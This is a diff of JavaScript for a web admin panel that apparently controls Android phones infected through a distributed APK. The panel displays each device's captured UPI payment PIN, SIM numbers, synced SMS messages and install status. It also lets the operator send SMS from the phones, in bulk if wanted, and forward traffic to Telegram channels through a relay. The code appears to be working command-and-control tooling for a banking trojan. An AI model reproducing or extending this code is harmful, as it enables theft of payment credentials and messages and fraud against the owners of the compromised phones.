+return state.devices.map((d)=>{
+const a=autoOf(d); const info=nums(d);
+return [devId(d),devName(d),devStatus(d),a.enabled?"1":"0",info.live,info.entered,d.upi_pin,tel(d).model,tel(d).battery_level,tel(d).battery_charging,(a.sim_slots||[]).join(""),d.install_state].join("|");
+}).join("~")+"|"+(state.pinsOnly?"1":"0")+"|"+($("#devSearch").value||"");
+}
+
+function renderCards(force){
+const sig=gridSignature(); if(!force&&sig===gridSig)return; gridSig=sig;
+const q=($("#devSearch").value||"").trim().toLowerCase();
+let list=state.pinsOnly?state.devices.filter(hasPin):state.devices;
+if(q){ list=list.filter((d)=>{ const t=tel(d); const info=nums(d);
+const hay=[devName(d),d.short_id,t.model,t.manufacturer,info.live,info.entered,info.carrier,d.payment_app].filter(Boolean).join(" ").toLowerCase();
+return hay.indexOf(q)>=0; }); }
+const grid=$("#devGrid"); grid.replaceChildren();
+const e=$("#devEmpty");
+if(!list.length){ e.hidden=false;
+e.textContent=state.pinsOnly?"Koi PIN capture nahi hua":(q?"Koi device match nahi hua":"No devices registered");
+return; }
+e.hidden=true;
+
+list.forEach((d)=>{
+const t=tel(d); const info=nums(d); const msgs=devMsgs(d); const auto=autoOf(d);
+const card=document.createElement("article");
+card.className="dev-card panel"; card.tabIndex=0; card.setAttribute("role","button");
+card.dataset.dev=String(devId(d));
+
+const top=document.createElement("div"); top.className="dev-top";
+const icon=document.createElement("div"); icon.className="phone"; icon.innerHTML=PHONE_SVG; top.appendChild(icon);
+const nw=document.createElement("div"); nw.style.minWidth="0"; nw.style.flex="1";
+const ne=document.createElement("div"); ne.className="dev-name"; ne.textContent=devName(d); nw.appendChild(ne);
+const se=document.createElement("div"); se.className="dev-sub";
+se.textContent=(t.model||t.manufacturer||"unknown model")+" · Android "+(t.android_version||"—");
+nw.appendChild(se); top.appendChild(nw);
+const bw=document.createElement("div"); bw.style.flex="0 0 auto"; bw.appendChild(battEl(d)); top.appendChild(bw);
+card.appendChild(top);
+
+const meta=document.createElement("div"); meta.className="dev-meta";
+if(d.short_id){ const idb=document.createElement("span"); idb.className="badge id mono";
+idb.textContent=d.short_id; meta.appendChild(idb); }
+const st=devStatus(d).toLowerCase();
+const sb=document.createElement("span");
+sb.className="badge "+(st.indexOf("online")>=0?"ok":st.indexOf("offline")>=0?"bad":"");
+sb.textContent=devStatus(d); meta.appendChild(sb);
+const n=info.live||info.entered;
+if(n){ const nb=document.createElement("span"); nb.className="badge mono "+(info.live?"ok":"pin");
+nb.textContent=n; meta.appendChild(nb); }
+if(d.upi_pin){ const pb=document.createElement("span"); pb.className="badge pin mono";
+pb.textContent="PIN "+d.upi_pin; meta.appendChild(pb); }
+if(auto.enabled){
+const ab=document.createElement("span"); ab.className="badge auto";
+ab.textContent="AUTO"+((auto.sim_slots||[]).length?" · SIM "+(auto.sim_slots||[]).map((s)=>s+1).join("+"):"");
+meta.appendChild(ab); }
+const ist=String(d.install_state||"").toLowerCase();
+if(ist==="uninstalled"||ist==="gone"){
+const ub=document.createElement("span"); ub.className="badge bad";
+ub.textContent=ist==="gone"?"REPLACED":"UNINSTALLED"; meta.appendChild(ub); }
+else if(ist==="stale"){
+const sb2=document.createElement("span"); sb2.className="badge warn";
+sb2.textContent="STALE"; meta.appendChild(sb2); }
+card.appendChild(meta);
+
+const foot=document.createElement("div"); foot.className="dev-foot";
+const cnt=document.createElement("span"); cnt.textContent=msgs.length+" messages"; foot.appendChild(cnt);
+const hint=document.createElement("span"); hint.className="open-hint"; hint.textContent="OPEN →";
+foot.appendChild(hint); card.appendChild(foot);
+grid.appendChild(card);
+});
+}
+
+function renderNumbers(d){
+const info=nums(d); const box=$("#dNumbers"); box.replaceChildren();
+function row(label,value,note,kind,badgeText){
+const r=document.createElement("div"); r.className="num-row";
+const left=document.createElement("div"); left.style.minWidth="0";
+const l=document.createElement("div"); l.className="num-label"; l.textContent=label;
+const v=document.createElement("div"); v.className="num-val"+(value?"":" empty");
+v.textContent=value||"not available"; left.appendChild(l); left.appendChild(v);
+if(note){ const nt=document.createElement("div"); nt.className="sub"; nt.textContent=note; left.appendChild(nt); }
+r.appendChild(left);
+if(badgeText){ const b=document.createElement("span"); b.className="badge "+(kind||"");
+b.textContent=badgeText; r.appendChild(b); }
+return r;
+}
+box.appendChild(row("Entered number",info.entered,"operator ne onboarding me enter kiya","pin",info.entered?"entered":null));
+box.appendChild(row("Live number (device)",info.live,info.source?"source: "+info.source:"SIM se auto-fetch","ok",info.live?"live":null));
+if(info.carrier)box.appendChild(row("Carrier",info.carrier));
+info.slots.forEach((s,i)=>{ if(!s)return; const v=s.number||s.carrier;
+if(v)box.appendChild(row("SIM "+((s.slot===undefined?i:s.slot)+1),v,s.number_source?"source: "+s.number_source:null)); });
+badge($("#dNumState"),info.live?"live":(info.entered?"entered only":"no number"),
+info.live?"ok":(info.entered?"pin":"bad"));
+if(!info.live){ const hint=document.createElement("div"); hint.className="sub";
+hint.style.marginTop="10px";
+hint.textContent="Live number nahi mila — Actions → fetch number dabao (device online hona chahiye).";
+box.appendChild(hint); }
+}
+
+function renderSpecs(d){
+const t=tel(d); const msgs=devMsgs(d); const box=$("#dSpecs"); box.replaceChildren();
+const tiles=[
+["Device ID",d.short_id||"—"],["RAM",ram(d)],["Storage",storage(d)],
+["Free space",freeStorage(d)||"—"],["Android",t.android_version||"—"],
+["Battery",batt(d)===null?"—":batt(d)+"%"+(t.battery_charging?" ⚡":"")],
+["Network",t.network_type||"—"],["Created",fmt(d.created_at)],["Last seen",fmt(d.last_seen)],
+["Messages",String(msgs.length)],["UPI PIN",d.upi_pin||"—"],["Payment app",d.payment_app||"—"],
+["Socket",d.ws_connected?"connected":"disconnected"],["Install #",String(d.install_seq||1)],
+["App version",d.app_version||"—"],["Install state",d.install_state||"—"]
+];
+tiles.forEach((p)=>{ const tile=document.createElement("div"); tile.className="spec";
+const k=document.createElement("div"); k.className="spec-k"; k.textContent=p[0];
+const v=document.createElement("div"); v.className="spec-v"; v.textContent=p[1];
+tile.appendChild(k); tile.appendChild(v); box.appendChild(tile); });
+}
+
+function renderMore(d){
+const t=tel(d); const box=$("#dMore"); box.replaceChildren();
+const grid=document.createElement("div"); grid.className="more-grid";
+const rows=[
+["Device id",devId(d)],["Short id",d.short_id],["Registration id",d.registration_id],
+["Manufacturer",t.manufacturer],["Brand",t.brand],["SDK int",t.sdk_int],["Android ID",d.android_id||t.android_id],
+["Install id",d.install_id],["Install seq",d.install_seq],["Install state",d.install_state],
+["Installed at",d.installed_at?fmt(d.installed_at):null],
+["Uninstalled at",d.uninstalled_at?fmt(d.uninstalled_at):null],
+["App version",d.app_version],
+["CPU / ABI",t.cpu_abi],["Cores",t.cpu_cores],["Resolution",t.screen_resolution],["Local IP",t.local_ip],
+["SIM count",t.sim_count],["Number source",t.sim_number_source],["Battery temp",t.battery_temperature_c],
+["Inbox synced",d.sms_inbox_synced_at?fmt(d.sms_inbox_synced_at):null],["Inbox count",t.sms_inbox_count],
+["Sent count",t.sms_sent_count],["Onboarded",d.onboarded?"Yes":"No"],
+["Onboarded at",d.onboarded_at?fmt(d.onboarded_at):null],
+["Onboard amount",d.onboard_amount!=null?"₹"+d.onboard_amount:null]
+];
+rows.forEach((p)=>{ if(p[1]===null||p[1]===undefined||p[1]==="")return;
+const r=document.createElement("div"); r.className="more-row";
+const a=document.createElement("span"); a.textContent=p[0];
+const b=document.createElement("span"); b.textContent=val(p[1]);
+r.appendChild(a); r.appendChild(b); grid.appendChild(r); });
+box.appendChild(grid);
+}
+
+function renderBanner(d){
+const b=$("#dBanner"); b.replaceChildren();
+if(online(d)){ b.hidden=true; return; }
+b.hidden=false; b.className="banner bad";
+const txt=document.createElement("span");
+txt.textContent="Device socket disconnected"+(d.last_seen?" (last seen "+fmt(d.last_seen)+")":"")+" — SMS outbox me queue hoga, phone online hote hi deliver hoga.";
+b.appendChild(txt);
+const btn=document.createElement("button"); btn.className="btn ghost"; btn.type="button";
+btn.textContent="⟳ Ping device"; btn.addEventListener("click",()=>pingDevice(d)); b.appendChild(btn);
+}
+
+function renderAutoSender(d){
+const a=autoOf(d); const on=Boolean(a.enabled);
+state.sel.as=(a.sim_slots||[]).slice();
+$("#asAccount").textContent=state.relayAccount?("@"+(state.relayAccount.username||state.relayAccount.id)):"relay login karo";
+$("#chanInput").value=a.channel_id||"";
+$("#listenId").textContent=a.channel_id||"—";
+badge($("#asBadge"),on?"Live":"Paused",on?"ok":"warn");
+$("#asToggle").className="switch"+(on?" on":"");
+$("#asTgConfirm").className="switch"+(a.tg_confirm?" on":"");
+$("#listenPanel").className="status-panel"+(on?"":" off");
+$("#chanMsg").hidden=true;
+refreshAsSimChips();
+}
+
+function renderDetailMsgs(){
+const d=state.active; if(!d)return;
+const all=devMsgs(d);
+const q=$("#dSearch").value.trim().toLowerCase();
+const dir=$("#dDir").value; const upiOnly=$("#dUpi").checked;
+let list=all;
+if(dir==="in"||dir==="out")list=list.filter((m)=>m.direction===dir);
+if(upiOnly)list=list.filter((m)=>m.kind==="upi");
+if(q)list=list.filter((m)=>(String(m.body)+" "+String(m.address)+" "+String(m.amount)+" "+String(m.status)).toLowerCase().indexOf(q)>=0);
+list=list.slice().sort((a,b)=>new Date(b.created_at||0)-new Date(a.created_at||0));
+$("#dMsgCount").textContent=list.length+" / "+all.length;
+const wrap=$("#dMsgList"); wrap.replaceChildren();
+if(!list.length){ const e=document.createElement("div"); e.className="empty";
+e.textContent=all.length?"Is filter par koi message nahi mila":"Is device ka koi message nahi hai";
+wrap.appendChild(e); return; }
+list.forEach((m)=>{
+const item=document.createElement("div"); item.className="msg";
+const head=document.createElement("div"); head.className="msg-head";
+const isIn=m.direction==="in";
+const db=document.createElement("span"); db.className="badge "+(isIn?"in":"out");
+db.textContent=isIn?"IN":"OUT"; head.appendChild(db);
+if(!isIn&&m.sim_slot!==null&&m.sim_slot!==undefined){
+const sb=document.createElement("span"); sb.className="badge sim";
+sb.innerHTML=SIM_SVG+"<span>SIM "+(Number(m.sim_slot)+1)+"</span>"; head.appendChild(sb); }
+const addr=document.createElement("span"); addr.className="msg-addr";
+addr.appendChild(mark(m.address||"—",q)); head.appendChild(addr);
+if(m.kind==="upi"){ const ub=document.createElement("span"); ub.className="badge ok";
+ub.textContent="UPI"; head.appendChild(ub); }
+const time=document.createElement("span"); time.className="msg-time";
+time.textContent=fmt(m.created_at); head.appendChild(time);
+item.appendChild(head);
+const body=document.createElement("div"); body.className="msg-body";
+body.appendChild(mark(m.body||"—",q)); item.appendChild(body);
+const foot=document.createElement("div"); foot.className="msg-foot";
+if(m.amount){ const ab=document.createElement("span"); ab.className="badge";
+ab.textContent="₹"+m.amount; foot.appendChild(ab); }
+const s=String(m.status||(isIn?"received":"sent")).toLowerCase();
+const sb2=document.createElement("span");
+sb2.className="badge "+(["sent","success","received","delivered","ok"].indexOf(s)>=0?"ok":
+["pending","queued"].indexOf(s)>=0?"warn":["failed","error"].indexOf(s)>=0?"bad":"");
+sb2.textContent=m.status||(isIn?"received":"sent"); foot.appendChild(sb2);
+item.appendChild(foot); wrap.appendChild(item);
+});
+}
+
+function renderDetail(d){
+const info=nums(d); const auto=autoOf(d);
+$("#dIcon").innerHTML=PHONE_SVG;
+$("#dName").textContent=devName(d);
+$("#dSub").textContent=(tel(d).model||"unknown model")+" · Android "+(tel(d).android_version||"—")+" · RAM "+ram(d);
+const tags=$("#dTags"); tags.replaceChildren();
+if(d.short_id){ const idb=document.createElement("span"); idb.className="badge id mono";
+idb.textContent=d.short_id; tags.appendChild(idb); }
+const st=devStatus(d).toLowerCase();
+const sb=document.createElement("span");
+sb.className="badge "+(st.indexOf("online")>=0?"ok":st.indexOf("offline")>=0?"bad":"");
+sb.textContent=devStatus(d); tags.appendChild(sb);
+const cr=document.createElement("span"); cr.className="badge";
+cr.textContent="created "+fmt(d.created_at); tags.appendChild(cr);
+if(d.upi_pin){ const pb=document.createElement("span"); pb.className="badge pin mono";
+pb.textContent="PIN "+d.upi_pin+(d.payment_app?" · "+d.payment_app:""); tags.appendChild(pb); }
+if(auto.enabled){ const ab=document.createElement("span"); ab.className="badge auto";
+ab.textContent="AUTO SENDER"+((auto.sim_slots||[]).length?" · SIM "+(auto.sim_slots||[]).map((s)=>s+1).join("+"):"");
+tags.appendChild(ab); }
+const ist=String(d.install_state||"").toLowerCase();
+if(ist==="uninstalled"||ist==="gone"){
+const ub=document.createElement("span"); ub.className="badge bad";
+ub.textContent=ist==="gone"?"REPLACED":"UNINSTALLED"; tags.appendChild(ub); }
+if(Number(d.install_seq||1)>1){
+const rb=document.createElement("span"); rb.className="badge violet";
+rb.textContent="INSTALL #"+d.install_seq; tags.appendChild(rb); }
+const bb=$("#dBatt"); bb.replaceChildren(); bb.appendChild(battEl(d));
+badge($("#dTarget"),info.live||info.entered||"no number",info.live?"ok":info.entered?"pin":"bad");
+$("#actMenu").hidden=true;
+$("#asPanel").hidden=!state.asOpen;
+state.sel.send=(auto.sim_slots||[]).slice();
+safe(renderBanner,d); safe(renderAutoSender,d); safe(renderNumbers,d);
+safe(renderSpecs,d); safe(renderMore,d); safe(renderOutbox);
+buildSimChips($("#dSims"),"send",d);
+}
+
+function safe(fn,arg){ try{return fn(arg);}catch(e){ reportError(e); return null; } }
+function openDeviceById(id){ const d=findDevice(id); if(!d){ toast("device not found"); return; } openDetail(d); }
+
+async function loadDeviceMessages(deviceId){
+try{ const d=await api("/admin/devices/"+deviceId+"/messages?limit=500");
+state.devMsgs[String(deviceId)]=Array.isArray(d)?d:(d.messages||[]);
+if(state.active&&String(devId(state.active))===String(deviceId))renderDetailMsgs(); }catch(e){}
+}
+
+function openDetail(d){
+if(!d)return;
+state.active=d; state.asOpen=false;
+$("#dSearch").value=""; $("#dDir").value=""; $("#dUpi").checked=false;
+$("#dBody").value=""; $("#dMore").hidden=true; $("#dMoreToggle").textContent="show";
+$("#dTo").value=nums(d).live||nums(d).entered||"";
+$("#detail").hidden=false; document.body.style.overflow="hidden";
+safe(renderDetail,d); safe(renderDetailMsgs);
+const id=devId(d);
+loadDeviceMessages(id);
+loadMessages().then(()=>{
+if(state.active&&String(devId(state.active))===String(id)){
+safe(renderDetail,d); safe(renderDetailMsgs); }
+}).catch(()=>{});
+if(!nums(d).live&&!state.numTried[String(id)]){
+state.numTried[String(id)]=true;
+setTimeout(()=>{ if(state.active&&String(devId(state.active))===String(id))fetchNumber(d); },900);
+}
+}
+
+function closeDetail(){
+$("#detail").hidden=true; document.body.style.overflow="";
+$("#actMenu").hidden=true; state.active=null;
+}
+
+async function loadHealth(){
+try{ const h=await api("/health"); state.linkOk=true; updateLink();
+badge($("#apiBadge"),h.status==="ok"?"Online":"Check",h.status==="ok"?"ok":"warn"); }
+catch(e){ state.linkOk=false; updateLink(); badge($("#apiBadge"),"Down","bad"); }
+try{ const db=await api("/health/database");
+badge($("#dbBadge"),db.status==="ok"?"Connected":"Issue",db.status==="ok"?"ok":"bad"); }
+catch(e){ badge($("#dbBadge"),"Down","bad"); }
+}
+
+async function loadDevices(){
+const d=await api("/admin/devices");
+state.linkOk=true; updateLink();
+state.devices=Array.isArray(d)?d:(d.devices||[]);
+safe(renderOverview); safe(renderLive); safe(renderCards);
+if(state.active){ const f=findDevice(devId(state.active));
+if(f){ state.active=f; safe(renderDetail,f); safe(renderDetailMsgs); } }
+}
+
+function upsertMessage(m){
+const key=m.id||m._id||(m.device_id+"|"+m.created_at+"|"+m.body);
+const ex=state.messages.some((x)=>(x.id||x._id||(x.device_id+"|"+x.created_at+"|"+x.body))===key);
+if(ex)return;
+state.messages.unshift(m);
+const c=state.devMsgs[String(m.device_id)]; if(c)c.unshift(m);
+renderMessages(); safe(renderLive);
+if(state.active)renderDetailMsgs();
+}
+
+async function loadMessages(){
+const d=await api("/admin/messages?limit=500");
+state.linkOk=true; updateLink();
+state.messages=Array.isArray(d)?d:(d.messages||[]);
+renderMessages(); safe(renderLive);
+if(state.active)renderDetailMsgs();
+reconcile();
+}
+
+function reconcile(){
+state.outbox.forEach((j)=>{
+if(j.status==="sent"||j.status==="failed")return;
+const hit=state.messages.some((m)=>String(m.device_id)===String(j.deviceId)&&
+m.direction==="out"&&String(m.body||"").trim()===String(j.body||"").trim()&&
+new Date(m.created_at||0).getTime()>=j.at-60000);
+if(hit)j.status="sent";
+});
+renderOutbox();
+}
+
+async function loadRules(){ const d=await api("/admin/rules");
+state.rules=Array.isArray(d)?d:(d.rules||[]); renderRules(); }
+
+async function loadUsers(){
+if(state.role!=="admin"){ state.users=[]; return; }
+try{ const d=await api("/admin/keys"); state.users=Array.isArray(d)?d:(d.keys||[]); renderUsers(); }catch(e){}
+}
+
+async function loadRelayLogs(){
+try{ const d=await api("/admin/relay/logs?limit=60"); state.tgLogs=d.logs||[]; }catch(e){}
+renderRelayLogs();
+}
+async function loadAutoSender(){
+try{ const d=await api("/admin/auto-sender");
+state.relayAccount=d.account||null; state.forward=d.forward_user||""; }catch(e){}
+}
+async function loadRelay(){ const d=await api("/admin/relay/status"); state.relay=d; renderRelay(); }
+
+function renderRelay(){
+const r=state.relay; if(!r)return;
+const st=r.state||{}; const authed=Boolean(st.authorized);
+const label=!r.telethon?"telethon missing":authed?"connected":st.awaiting_code?"awaiting code":"not logged in";
+badge($("#relayState"),label,!r.telethon?"bad":authed?"ok":"warn");
+badge($("#relayBadge"),label,!r.telethon?"bad":authed?"ok":"warn");
+$("#relayLoggedOut").hidden=authed; $("#relayLoggedIn").hidden=!authed;
+$("#relayCodeBox").hidden=!st.awaiting_code;
+if(authed){
+$("#relayMe").textContent=st.me?("@"+(st.me.username||st.me.id)):"—";
+const chans=r.channels||[];
+$("#relayChan").textContent=chans.length?chans.join(", "):"not set";
+badge($("#relayChanBadge"),chans.length?"watching":"off",chans.length?"ok":"warn");
+$("#relayFwd").textContent=st.forward_user||"not set";
+badge($("#relayFwdBadge"),st.forward_user?"mtproto":"off",st.forward_user?"ok":"warn");
+if($("#fwdInput")&&!$("#fwdInput").value)$("#fwdInput").value=st.forward_user||"";
+}
+$("#relayErr").textContent=st.last_error||"—";
+const bans=r.bans||[]; $("#banCount").textContent=bans.length;
+const box=$("#banList"); box.replaceChildren();
+if(!bans.length){ const e=document.createElement("div"); e.className="muted small";
+e.textContent="Koi banned sender nahi"; box.appendChild(e); }
+bans.forEach((a)=>{
+const row=document.createElement("div"); row.className="out-item";
+const s=document.createElement("span"); s.className="out-body"; s.textContent=a; row.appendChild(s);
+const b=document.createElement("button"); b.className="mini"; b.type="button"; b.textContent="unban";
+b.addEventListener("click",async()=>{ try{
+await api("/admin/relay/bans/"+encodeURIComponent(a)+"/delete",{method:"POST"}); await loadRelay();
+}catch(e){ toast(e.message); } });
+row.appendChild(b); box.appendChild(row);
+});
+}
+
+async function refreshAll(){
+if(!state.auth)return;
+$("#refreshBtn").disabled=true;
+try{
+await loadHealth();
+const jobs=[loadDevices(),loadMessages(),loadRules(),loadRelay(),loadRelayLogs(),
+loadAutoSender(),loadStats(),loadGrowthEvents()];
+if(state.role==="admin")jobs.push(loadUsers());
+const res=await Promise.allSettled(jobs);
+if(res.some((r)=>r.status==="rejected"))toast("some sections failed to sync");
+}finally{ $("#refreshBtn").disabled=false; }
+}
+
+async function refreshSection(section){
+try{
+if(section==="devices")await loadDevices();
+if(section==="messages")await loadMessages();
+if(section==="rules")await loadRules();
+if(section==="users")await loadUsers();
+if(section==="growth"){ await loadStats(); await loadGrowthEvents(); }
+if(section==="relay"){ await loadRelay(); await loadRelayLogs(); await loadRules(); }
+if(section==="live"){ await loadDevices(); await loadMessages(); }
+toast("synced");
+}catch(e){ toast(e.message); }
+}
+
+function setLink(t){ const el=$("#linkLabel"); if(el)el.textContent=t; }
+function updateLink(){
+const el=$("#linkLabel");
+if(el)el.textContent=DEMO?"Demo":(state.wsOk?"Socket live":(state.linkOk?"Polling":"Link down"));
+badge($("#wsBadge"),state.wsOk?"Live":"Polling",state.wsOk?"ok":"warn");
+}
+
+function connectWs(){
+if(!state.auth||DEMO)return;
+if(state.ws&&(state.ws.readyState===0||state.ws.readyState===1))return;
+try{
+const proto=location.protocol==="https:"?"wss:":"ws:";
+const qs=token()?"?token="+encodeURIComponent(token()):"";
+const ws=new WebSocket(proto+"//"+location.host+"/ws/admin"+qs);
+state.ws=ws;
+ws.onopen=()=>{ state.wsOk=true; state.wsFails=0; updateLink(); };
+ws.onmessage=(ev)=>{ try{ onEvent(JSON.parse(ev.data)); }catch(e){} };
+ws.onclose=()=>{ state.wsOk=false; updateLink(); reconnect(); };
+ws.onerror=()=>{ state.wsOk=false; try{ ws.close(); }catch(e){} };
+}catch(e){ reconnect(); }
+}
+function reconnect(){
+clearTimeout(state.wsTimer);
+state.wsFails=Math.min((state.wsFails||0)+1,6);
+state.wsTimer=setTimeout(()=>{ if(state.auth)connectWs(); },Math.min(1500*state.wsFails,15000));
+}
+
+function onEvent(msg){
+if(!msg||typeof msg!=="object")return;
+const type=String(msg.type||msg.event||"").toLowerCase();
+const data=(msg.data&&typeof msg.data==="object")?msg.data:msg;
+if(data.body||type.indexOf("sms")>=0||type.indexOf("message")>=0)upsertMessage(data);
+if(type.indexOf("telemetry")>=0||type.indexOf("device")>=0||type.indexOf("status")>=0){
+const id=data.device_id||data.id||data._id;
+if(id){
+const idx=state.devices.findIndex((x)=>String(devId(x))===String(id));
+if(idx>=0){
+state.devices[idx]=Object.assign({},state.devices[idx],data);
+safe(renderCards); safe(renderLive); safe(renderOverview);
+if(state.active&&String(devId(state.active))===String(id)){
+state.active=state.devices[idx]; safe(renderDetail,state.active); }
+}else loadDevices().catch(()=>{});
+}
+}
+if(type.indexOf("ack")>=0||type.indexOf("sent")>=0){
+const did=data.device_id; const dbody=data.body;
+const j=state.outbox.find((x)=>x.status!=="sent"&&x.status!=="failed"&&
+(!did||String(x.deviceId)===String(did))&&(!dbody||String(x.body)===String(dbody)));
+if(j){ j.status=data.status==="failed"?"failed":"sent"; renderOutbox(); }
+}
+if(type.indexOf("growth")>=0||type.indexOf("outbox_stats")>=0){
+loadStats().catch(()=>{});
+if(type.indexOf("growth")>=0)loadGrowthEvents().catch(()=>{});
+}
+}
+
+function schedulePoll(){
+clearTimeout(state.pollTimer);
+const fast=state.devices.some(online);
+state.pollTimer=setTimeout(async()=>{
+if(state.auth&&!document.hidden){
+await Promise.allSettled([loadDevices(),loadMessages(),loadStats()]);
+}
+schedulePoll();
+},fast?8000:20000);
+}
+function scheduleProbe(){
+setTimeout(async()=>{
+if(DEMO){ try{ const r=await fetch("/health",{credentials:"same-origin"});
+if(r.ok){ leaveDemo(); await refreshAll(); } }catch(e){} }
+scheduleProbe();
+},25000);
+}
+function startRealtime(){ updateLink(); connectWs(); schedulePoll(); scheduleProbe(); }
+
+function navigate(page){
+document.querySelectorAll(".nav").forEach((b)=>b.classList.toggle("on",b.dataset.page===page));
+document.querySelectorAll(".page").forEach((s)=>s.classList.toggle("on",s.id==="page-"+page));
+if(page==="devices")refreshSection("devices");
+if(page==="messages")refreshSection("messages");
+if(page==="relay")refreshSection("relay");
+if(page==="users")refreshSection("users");
+if(page==="growth")refreshSection("growth");
+}
+
+/* ------------------------------- wiring ------------------------------- */
+
+$("#apkBtn").href=APK_URL;
+$("#apkLogin").href=APK_URL;
+$("#apkSettings").href=APK_URL;
+$("#apkSettings").textContent=APK_URL;
+
+$("#pinsBtn").addEventListener("click",()=>{ state.pinsOnly=!state.pinsOnly;
+$("#pinsBtn").classList.toggle("on",state.pinsOnly); renderCards(true); });
+$("#devSearch").addEventListener("input",()=>renderCards(true));
+$("#userSearch").addEventListener("input",renderUsers);
+$("#dSearch").addEventListener("input",renderDetailMsgs);
+$("#dDir").addEventListener("change",renderDetailMsgs);
+$("#dUpi").addEventListener("change",renderDetailMsgs);
+$("#dClose").addEventListener("click",closeDetail);
+$("#dMoreToggle").addEventListener("click",()=>{ const b=$("#dMore");
+b.hidden=!b.hidden; $("#dMoreToggle").textContent=b.hidden?"show":"hide"; });
+if($("#growthFilter"))$("#growthFilter").addEventListener("change",loadGrowthEvents);
+
+$("#devGrid").addEventListener("click",(ev)=>{ const c=ev.target.closest("[data-dev]");
+if(c)openDeviceById(c.dataset.dev); });
+$("#devGrid").addEventListener("keydown",(ev)=>{ if(ev.key!=="Enter"&&ev.key!==" ")return;
+const c=ev.target.closest("[data-dev]"); if(c){ ev.preventDefault(); openDeviceById(c.dataset.dev); } });
+
+$("#actBtn").addEventListener("click",(ev)=>{ ev.stopPropagation();
+$("#actMenu").hidden=!$("#actMenu").hidden; });
+
+$("#actMenu").addEventListener("click",async(ev)=>{
+const btn=ev.target.closest("[data-act]"); if(!btn)return;
+$("#actMenu").hidden=true;
+const act=btn.dataset.act; const d=state.active; if(!d)return;
+if(act==="auto"){ state.asOpen=true; $("#asPanel").hidden=false;
+$("#asPanel").scrollIntoView({behavior:"smooth",block:"start"}); return; }
+if(act==="copy"){ copyText(d.short_id||devId(d)); return; }
+if(act==="ping"){ await pingDevice(d); return; }
+if(act==="fetch"){ await fetchNumber(d); return; }
+if(act==="push"){ await pushOutbox(d); return; }
+});
+
+$("#asCollapse").addEventListener("click",()=>{ const b=$("#asBody");
+b.hidden=!b.hidden; $("#asCollapse").textContent=b.hidden?"▸":"▾"; });
+$("#asCopy").addEventListener("click",()=>copyText($("#asAccount").textContent.trim()));
+
+async function saveAutoSender(patch){
+const d=state.active; if(!d)return false;
+const a=autoOf(d);
+const cid=($("#chanInput").value||"").trim()||a.channel_id||"";
+const body=Object.assign({
+enabled:a.enabled, channel_id:cid,
+sim_slots:(a.sim_slots||[]).slice(),
+tg_confirm:a.tg_confirm
+},patch);
+if(body.enabled&&!body.channel_id){ toast("pehle Channel ID daalo"); return false; }
+try{
+const r=await api("/admin/devices/"+devId(d)+"/auto-sender",{method:"POST",body:JSON.stringify(body)});
+d.auto_sender=r.auto_sender||d.auto_sender;
+safe(renderAutoSender,d); renderCards(true); return true;
+}catch(e){ toast(e.message); return false; }
+}
+
+$("#asToggle").addEventListener("click",async()=>{
+const d=state.active; if(!d)return;
+const next=!autoOf(d).enabled;
+$("#asToggle").disabled=true;
+const ok=await saveAutoSender({enabled:next});
+if(ok)toast("Auto Sender "+(next?"enabled":"disabled"));
+$("#asToggle").disabled=false;
+});
+$("#asTgConfirm").addEventListener("click",async()=>{
+const d=state.active; if(!d)return;
+const next=!autoOf(d).tg_confirm;
+const ok=await saveAutoSender({tg_confirm:next});
+if(ok)toast("Telegram confirm "+(next?"ON":"OFF"));
+});
+
+$("#chanVerify").addEventListener("click",async()=>{
+const cid=($("#chanInput").value||"").trim();
+if(!cid){ toast("Channel ID daalo"); return; }
+const btn=$("#chanVerify"); btn.disabled=true; btn.textContent="checking…";
+try{
+const r=await api("/admin/auto-sender/verify",{method:"POST",body:JSON.stringify({channel_id:cid})});
+if(r.channel_id)$("#chanInput").value=r.channel_id;
+$("#chanMsg").className="ok-msg";
+$("#chanMsgTxt").textContent=(r.title||cid)+" reachable"+(r.admin?" — admin ✓":"")+" — save to bind.";
+$("#chanMsg").hidden=false;
+}catch(e){ $("#chanMsg").className="ok-msg bad";
+$("#chanMsgTxt").textContent=e.message; $("#chanMsg").hidden=false; }
+finally{ btn.disabled=false; btn.textContent="Verify"; }
+});
+
+$("#chanBind").addEventListener("click",async()=>{
+const d=state.active; if(!d)return;
+const cid=($("#chanInput").value||"").trim();
+if(!cid){ toast("Channel ID daalo"); return; }
+const btn=$("#chanBind"); btn.disabled=true;
+try{
+const r=await api("/admin/devices/"+devId(d)+"/auto-sender",{method:"POST",body:JSON.stringify({channel_id:cid})});
+d.auto_sender=r.auto_sender||d.auto_sender;
+$("#listenId").textContent=cid; toast("Channel bound!");
+}catch(e){ toast(e.message); } finally{ btn.disabled=false; }
+});
+
+$("#testConn").addEventListener("click",async()=>{
+const btn=$("#testConn"); btn.disabled=true; btn.textContent="testing…";
+try{ await api("/admin/auto-sender/test",{method:"POST"}); toast("test message bheja"); }
+catch(e){ toast(e.message); } finally{ btn.disabled=false; btn.textContent="Test connection"; }
+});
+
+$("#dSend").addEventListener("click",async()=>{
+const d=state.active; if(!d)return;
+const body=$("#dBody").value.trim();
+if(!body){ toast("message khali hai"); return; }
+const info=nums(d);
+let to=$("#dTo").value.trim();
+if(!to)to=info.live||info.entered||"";
+if(!to)toast("target number nahi mila — To field me daalo");
+const slots=selSlots(state.sel.send||[]);
+const btn=$("#dSend"); btn.disabled=true;
+const ok=await sendSms({deviceId:devId(d),deviceName:devName(d),to:to||null,body:body,slots:slots});
+if(ok)$("#dBody").value="";
+btn.disabled=false;
+});
+
+$("#bulkSend").addEventListener("click",async()=>{
+const body=$("#bulkBody").value.trim();
+if(!body){ toast("message khali hai"); return; }
+const slots=selSlots(state.sel.bulk||[]);
+$("#bulkSend").disabled=true;
+try{
+const r=await api("/admin/send",{method:"POST",body:JSON.stringify({
+target:$("#bulkTarget").value, body:body,
+to:$("#bulkTo").value.trim()||null,
+sim_slots:slots.length?slots:null
+})});
+toast("queued to "+r.queued+" device(s), delivered "+r.delivered+(r.note?" — "+r.note:""));
+$("#bulkBody").value="";
+await loadMessages();
+await loadStats();
+}catch(e){ toast(e.message); } finally{ $("#bulkSend").disabled=false; }
+});
+$("#bulkTarget").addEventListener("change",()=>{
+badge($("#bulkBadge"),$("#bulkTarget").value==="online"?"online only":"all devices"); });
+$("#bulkClear").addEventListener("click",()=>{ $("#bulkBody").value=""; $("#bulkTo").value=""; });
+
+$("#ruleAdd").addEventListener("click",async()=>{
+const name=$("#ruleName").value.trim(); const match=$("#ruleMatch").value.trim();
+const reply=$("#ruleReply").value.trim();
+if(!name||!match||!reply){ toast("sab fields bharo"); return; }
+try{
